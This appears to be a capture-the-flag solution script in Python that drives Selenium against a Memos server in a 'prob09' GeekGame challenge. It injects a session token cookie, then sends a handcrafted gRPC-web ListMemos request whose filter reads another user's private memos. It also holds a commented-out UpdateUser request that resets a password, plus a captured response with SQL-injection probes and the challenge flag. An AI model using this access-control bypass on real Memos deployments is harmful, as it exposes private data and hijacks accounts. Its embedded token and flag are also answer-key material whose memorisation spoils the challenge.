instance = 'rnpmsago'

import selenium
import random
import time
# import requests

from seleniumrequests import Chrome
# from selenium import webdriver
# from selenium.webdriver.chrome.options import Options
# from selenium.webdriver.common.by import By
# from selenium.webdriver.support.ui import WebDriverWait
# from selenium.webdriver.support import expected_conditions as EC

# service = webdriver.chrome.service.Service('chromedriver.exe')

# chrome_options = Options()
# chrome_options.add_argument("--no-sandbox")

print('Launching browser...')
browser = Chrome()
browser.maximize_window()

cookies = [{'domain' : f'prob09-{instance}.geekgame.pku.edu.cn', 
'name' : 'memos.access-token', 
'path' : '/', 
'value' : 'eyJhbGciOiJIUzI1NiIsImtpZCI6InYxIiwidHlwIjoiSldUIn0.eyJuYW1lIjoiIiwiaXNzIjoibWVtb3MiLCJzdWIiOiIyIiwiYXVkIjpbInVzZXIuYWNjZXNzLXRva2VuIl0sImV4cCI6MTcyOTU3ODk5MywiaWF0IjoxNzI4OTc0MTkzfQ.WG3Q5bDXATR_MPXvbMKQEbSCbrj2RsiAcSKZXlT5laA'
},
{'domain' : f'prob09-{instance}.geekgame.pku.edu.cn', 
'name' : 'anticheat_canary',
'path' : '/', 
'value' : 'jyvgzqkuuc'
}
]

browser.get(f'http://prob09-{instance}.geekgame.pku.edu.cn')
bcookies = browser.get_cookies()
print(bcookies)

import time
time.sleep(5)

try:
    print('Setting Cookies ...')
    for cookie in cookies:
        browser.add_cookie(cookie)
except selenium.common.exceptions.UnableToSetCookieException:
    print('Error | Can\'t set cookies')


browser.get(f'http://prob09-{instance}.geekgame.pku.edu.cn')

Headers = {
    'authority': f'prob09-{instance}.geekgame.pku.edu.cn',
    'accept': '*/*',
    'accept-language': 'zh-CN,zh;q=0.9',
    'cache-control': 'no-cache',
    'content-type': 'application/grpc-web+proto',
    'cookie': 'Hm_lvt_c7896bb34c3be32ea17322b5412545c0=1712768480; hb_MA-B701-2FC93ACD9328_source=entryhz.qiye.163.com; anticheat_canary=jyvgzqkuuc; memos.access-token=eyJhbGciOiJIUzI1NiIsImtpZCI6InYxIiwidHlwIjoiSldUIn0.eyJuYW1lIjoiIiwiaXNzIjoibWVtb3MiLCJzdWIiOiIyIiwiYXVkIjpbInVzZXIuYWNjZXNzLXRva2VuIl0sImV4cCI6MTcyOTU3ODk5MywiaWF0IjoxNzI4OTc0MTkzfQ.WG3Q5bDXATR_MPXvbMKQEbSCbrj2RsiAcSKZXlT5laA',
    'origin': f'https://prob09.{instance}.geekgame.pku.edu.cn',
    'pragma': 'no-cache',
    'referer': f'https://prob09.{instance}.geekgame.pku.edu.cn/setting',
    'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.95 Safari/537.36',
    'x-grpc-web': '1',
}

Data = b'\x00\x00\x00\x00\x00\x00\x00\x00E\x00\x08\x00\x10\x00\x1aArow_status == "NORMAL" && visibilities == [\'PUBLIC\', \'PROTECTED\', \'PRIVATE\'] && row_status == "NORMAL" && creator == "users/1" && content_search == [""]'
# Data = b'\x00\x00\x00\x00\x00\x00\x00\x00&\n\x00\x18\n\x00\x07users/8J\r1145141919810\x00\x12\n\n\x00\x08password'
#with open('upload.post', 'r') as postData:
#    Data = postData.read()

print(Data)

time.sleep(5)

res = browser.request('POST', f'https://prob09-{instance}.geekgame.pku.edu.cn/memos.api.v1.MemoService/ListMemos', 
headers = Headers, data = Data)

# res = browser.request('POST', f'https://prob09-{instance}.geekgame.pku.edu.cn/memos.api.v1.UserService/UpdateUser', 
# headers = Headers, data = Data)

print(res.headers)
print(res.content)

time.sleep(1000)

# response = b'\x00\x00\x00\x05\x19\na\n\x07memos/7\x12\x16H6mKq6FVYmwZ2bZVCL4EqB\x18\x02"\x07users/2*\x06\x08\xd6\xaa\xb8\xb8\x062\x06\x08\xff\xab\xb8\xb8\x06:\x06\x08\xd6\xaa\xb8\xb8\x06B\x011J\x0e\x08\x02b\n\n\x08\x083\x9a\x03\x03\n\x011P\x01\x8a\x01\x00\x9a\x01\x021\n\na\n\x07memos/6\x12\x16noPjfYUVK5qvBMFnymzGGX\x18\x01"\x07users/2*\x06\x08\xd4\xaa\xb8\xb8\x062\x06\x08\xd4\xaa\xb8\xb8\x06:\x06\x08\xd4\xaa\xb8\xb8\x06B\x011J\x0e\x08\x02b\n\n\x08\x083\x9a\x03\x03\n\x011P\x02\x8a\x01\x00\x9a\x01\x021\n\ny\n\x07memos/5\x12\x16EAgdjKrJGiYgnwLpRqNK6y\x18\x01"\x07users/2*\x06\x08\xd8\x9c\xb8\xb8\x062\x06\x08\xd8\x9c\xb8\xb8\x06:\x06\x08\xd8\x9c\xb8\xb8\x06B\t\' OR 1=1?J\x16\x08\x02b\x12\n\x10\x083\x9a\x03\x0b\n\t\' OR 1=1?P\x03\x8a\x01\x00\x9a\x01\n\' OR 1=1?\n\ny\n\x07memos/4\x12\x168vtFxcwuS4GWZarWQygfiQ\x18\x01"\x07users/2*\x06\x08\xd5\x9c\xb8\xb8\x062\x06\x08\xd5\x9c\xb8\xb8\x06:\x06\x08\xd5\x9c\xb8\xb8\x06B\t\' OR 1=1?J\x16\x08\x02b\x12\n\x10\x083\x9a\x03\x0b\n\t\' OR 1=1?P\x03\x8a\x01\x00\x9a\x01\n\' OR 1=1?\n\n\x92\x01\n\x07memos/3\x12\x16YGrhH7X99LvGr2NhDgZ6Yn\x18\x01"\x07users/2*\x06\x08\xfe\x9b\xb8\xb8\x062\x06\x08\x88\x9c\xb8\xb8\x06:\x06\x08\xfe\x9b\xb8\xb8\x06B\tdata\' 1=1J\x16\x08\x02b\x12\n\x10\x083\x9a\x03\x0b\n\tdata\' 1=1P\x03\x82\x01\x16\x08\x03\x12\x07users/2\x1a\x07memos/3 \x01\x8a\x01\x00\x9a\x01\ndata\' 1=1\n\n\xa5\x02\n\x07memos/2\x12\x16KXyrPwJPRc4CT3q39hMsqB\x18\x01"\x07users/1*\x06\x08\xbe\xec\xfd\xb7\x062\x06\x08\xbe\xec\xfd\xb7\x06:\x06\x08\xbe\xec\xfd\xb7\x06B@Congratulations! Your flag is `flag{H3lL0-IcS-4gAIn-e4Sy-gUake}`JT\x08\x02bP\n%\x083\x9a\x03 \n\x1eCongratulations! Your flag is \n\'\x087\xba\x03"\n flag{H3lL0-IcS-4gAIn-e4Sy-gUake}P\x01\x8a\x01\x02 \x01\x9a\x01?Congratulations! Your flag is flag{H3lL0-IcS-4gAIn-e4Sy-gUake}\n\n\x9d\x03\n\x07memos/1\x12\x16JCuZyv9vmUVt7mdaF4TAFn\x18\x01"\x07users/1*\x06\x08\x9d\xec\xfd\xb7\x062\x06\x08\x9d\xec\xfd\xb7\x06:\x06\x08\x9d\xec\xfd\xb7\x06BrI think memos have some bug in its ORM implementation and I\'ve already applied a patch for that. Have a good time!J\x7f\x08\x02b{\ny\x083\x9a\x03t\nrI think memos have some bug in its ORM implementation and I\'ve already applied a patch for that. Have a good time!P\x03\x82\x01\x16\x08\x01\x12\x07users/2\x1a\x07memos/1 \x01\x8a\x01\x00\x9a\x01CI think memos have some bug in its ORM implementation and I\'ve a...\x80\x00\x00\x00\x10grpc-status: 0\r\n'

# flag = 'flag{H3lL0-IcS-4gAIn-e4Sy-gUake}'

